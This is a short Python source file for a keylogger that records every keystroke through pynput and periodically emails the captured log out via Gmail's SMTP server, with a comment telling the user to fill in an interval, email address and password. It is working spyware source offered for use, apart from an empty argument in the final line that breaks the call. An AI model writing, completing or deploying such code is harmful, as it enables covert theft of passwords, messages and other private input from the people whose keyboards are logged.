#!/usr/bin/env/python

import pynput.keyboard,threading,smtplib,subprocess,sys

class Keylogger:
    def __init__(self, interval, email,password):
        self.log="keylogger started"
        self.email=email
        self.password=password
        self.interval=interval

    def process_key_press(self,key):
        try:
            self.log=self.log+str(key.char)
        except AttributeError:
            if key==key.space:
                self.log=self.log+" "
            else:
                self.log=self.log+" "+str(key)+" "

    def sendmail(self, email, password, message):
        server=smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        self.sendmail(self.email, self.password, "\n\n"+self.log)
        self.log=" "
        timer=threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listner=pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listner:
            self.report()
            keyboard_listner.join()




#fill below like time(seconds), "youremail@gmail.com", "Passowrd"
#exapmle keylogger(5, "test@test.com","passwordtest") 
new_keylogger=Keylogger(,"", "")
new_keylogger.start()